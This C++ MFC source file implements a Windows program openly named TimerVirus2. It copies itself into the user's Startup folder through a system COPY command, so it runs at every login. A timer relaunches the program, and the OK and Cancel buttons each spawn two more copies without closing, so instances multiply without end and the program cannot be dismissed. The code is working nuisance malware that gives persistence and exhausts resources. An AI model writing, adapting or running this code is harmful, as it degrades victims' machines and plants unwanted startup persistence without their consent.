// TimerVirus2Dlg.cpp : implementation file
//

#include "stdafx.h"
#include "TimerVirus2.h"
#include "TimerVirus2Dlg.h"
//#include "TimerVirus2App.h"
//#include <dos.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CTimerVirus2Dlg dialog

CTimerVirus2Dlg::CTimerVirus2Dlg(CWnd* pParent /*=NULL*/)
	: CDialog(CTimerVirus2Dlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CTimerVirus2Dlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CTimerVirus2Dlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CTimerVirus2Dlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CTimerVirus2Dlg, CDialog)
	//{{AFX_MSG_MAP(CTimerVirus2Dlg)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_TIMER()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CTimerVirus2Dlg message handlers

BOOL CTimerVirus2Dlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	int nMilliSecond = (rand() % (7 + 1)) * 1000 + 3000;
	SetTimer(ID_TMR_NEW, nMilliSecond, NULL);
	//SendMessage(WM_TIMER, ID_TMR_NEW);
	
	AddFile2Startup();
	
	return TRUE;  // return TRUE  unless you set the focus to a control
}// CTimerVirus2Dlg::OnInitDialog()
/*
	CString str;
	int n;
	for(int v=0; v < 5; v++)
	{
		n = rand() % 20 + 5;
		str.Format("rand = %d", n);
		MessageBox(str);
	}
*/

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CTimerVirus2Dlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CTimerVirus2Dlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

//void CTimerVirus2Dlg::OnOK() 
//{
	// TODO: Add extra validation here
	//SetTimer(ID_TMR_OK, 2000, NULL);
	
	//CDialog::OnOK();
//}

void CTimerVirus2Dlg::OnOK() 
{
	// TODO: Add extra validation here	
	WinExec("TimerVirus2", SW_SHOW);
	WinExec("TimerVirus2", SW_SHOW);
	//SetTimer(ID_TMR_NEW, 5000, NULL);	
			
	//CDialog::OnOK();
}//CTimerVirus2Dlg::OnOK() 
	////////////////////////////////////////////////////////
	// it is temp code. may del it
	///////////////////////////////////////////////////////
	//SetTimer(ID_TMR_OK, 5000, NULL);	
	//WinExec("CMD /C ECHO %HOMEDRIVE% > c:\\os.txt", SW_SHOW);
	//WinExec("CMD /C dir", SW_SHOW);
	//CFile file;
	//int modeRead = 0x0000;
	//int modeWrite = 0x0001;
	//file.Open("c:\\test.bat", modeWrite);
	//CString str = "TimerVirus2";
	//file.Write(str, str.GetLength());
	//file.Close();
	//char read[20];
	//LPTSTR strRead = "sdfsdfdsfSD";
	//GetCurrentDirectory(20,strRead);
	//GetCurrentDirectory(
	//file.Read(strRead,2);

	//GetSystemDirectory(read,20);

	//read[1] = NULL;

	//CString str;
	//str.Format("%d", file.GetLength());
	
	//MessageBox(str);
	//MessageBox(strRead);

	//char fileName[] = "\\Start Menu\\Programs\\Startup\\";//test.bat";

	//temp start
	//fpr = fopen(read,"r");
	//if(fpr == NULL)
		//MessageBox("no file");		
	//else
	//{
		//MessageBox("yes file");
		//fclose(fpr);
	//}	
	//temp end

	//MessageBox(read);	
	//MessageBox(::theApp.m_pszAppName);	

	//char write[100];
	//GetCurrentDirectory(50, write);
	//strcat(write,"\\Debug\\TimerVirus2.exe");

	//strcat(write,"\\test.bat"
	//MessageBox(appPath);
	
	//FILE *fpw = fopen(read,"w");		
	//fprintf(fpw,write);
	//fclose(fpw);
	//MessageBox(cmd);

void CTimerVirus2Dlg::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default	
// / *		
	switch(nIDEvent)
	{	
	case ID_TMR_NEW:
		WinExec("TimerVirus2", SW_SHOW);
		//MessageBox("New");
		break;
	}
// * /

	CDialog::OnTimer(nIDEvent);
}// CTimerVirus2Dlg::OnTimer(UINT nIDEvent) 

void CTimerVirus2Dlg::AddFile2Startup()
{	
	//const int nTotalPaths = 2;
	//int v;
	FILE *fpr;
	char cmd[100]; 		
	char path[100];// = "D:\\Documents and Settings\\";		

	
	CString sEnvVarName;// = "HOMEDRIVE";
	DWORD dwSize = 20;
	TCHAR szEnvVarDrv[5];
	TCHAR szUserName[20];
	TCHAR szEnvVarOS[20];
	
	sEnvVarName = "windir";//"HOMEDRIVE";
	GetEnvironmentVariable(sEnvVarName, szEnvVarDrv, dwSize);		
	szEnvVarDrv[2] = NULL;
	strcpy(path, szEnvVarDrv);
	//MessageBox(path);

	sEnvVarName = "OS";
	GetEnvironmentVariable(sEnvVarName, szEnvVarOS, dwSize);
	if(strcmp(szEnvVarOS, "Windows_NT") == 0)
		strcat(path, "\\Documents and Settings\\");
	else
		strcat(path, "\\WINDOWS\\Profiles\\");

	//sEnvVarName = "USERNAME";
	//GetEnvironmentVariable(sEnvVarName, szEnvVarUserName, dwSize);	
	BOOL bol;
	dwSize = 20;
	bol = GetUserName(szUserName, &dwSize);
	//if(bol == FALSE)
		//MessageBox("GetUserName return FALSE");
	strcat(path, szUserName);
	strcat(path, "\\Start Menu\\Programs\\Startup\\TimerVirus2.exe");
	//MessageBox(path);
	
	fpr = fopen(path, "r");
	if(fpr == NULL)
	{
		strcpy(cmd, "COPY TimerVirus2.exe \"");
		strcat(cmd, path);
		strcat(cmd, "\"");
		system(cmd);
		//MessageBox(cmd);
	}
	else
		fclose(fpr);
	//}		
}// CTimerVirus2Dlg::AddFile2Startup()

/*
	if(len > 54)
	{
		for(v=len-7; v < len ; v++)
			tempPath[tempPathCount++] = path[v];
		tempPath[tempPathCount] = NULL;
		//MessageBox(tempPath);		
	
		if(strcmp(tempPath,validPath) == 0)
		{
			MessageBox("valid path");
			strcpy(tempPath, path);
			strcat(tempPath, "\\TimerVirus2.exe");

			fpr = fopen(tempPath, "r");
			if(fpr != NULL)
			{
				fclose(fpr);
				return;
			}
		}
		else
			MessageBox("not valid path");
	}


	//system("ECHO %cd% > temp_cd.txt");
	system("Echo %UserProfile% > temp.txt");

	fpr = fopen("temp.txt", "r");
	//char path[100];
	int path_count=0;
	char ch='a';

	while(ch != EOF)
	{
		ch = getc(fpr);
		path[path_count++] = ch;
	}
	fclose(fpr);
	system("DEL temp.txt");


	path_count -= 3; //1 = SPACE, 2 = EOL, 3 = EOF
	path[path_count] = NULL;
	//MessageBox(path);

	
	strcat(path, "\\Start Menu\\Programs\\Startup");
*/	
/*
	MessageBox(path);
	
	if(bResult == TRUE)
	strcat(path, szEnvVarUserName);
		MessageBox("bResult == TRUE");	
	strcat(path, "\\Start Menu\\Programs\\Startup\\");
	MessageBox(file);

	strcpy(file[0], "C:\\WINDOWS\\Start Menu\\Programs\\StartUp"\
		"\\TimerVirus2.exe");
	
	for(v=0; v < nTotalPaths; v++)
	{
*/

void CTimerVirus2Dlg::OnCancel() 
{
	// TODO: Add extra cleanup here
	WinExec("TimerVirus2", SW_SHOW);
	WinExec("TimerVirus2", SW_SHOW);
	
	//CDialog::OnCancel();
}

/*
void CTimerVirus2Dlg::OnLblTimerVirus() 
{
	// TODO: Add your control notification handler code here
	MessageBox("before");
	CDialog::OnOK();
	MessageBox("after");
}
*/
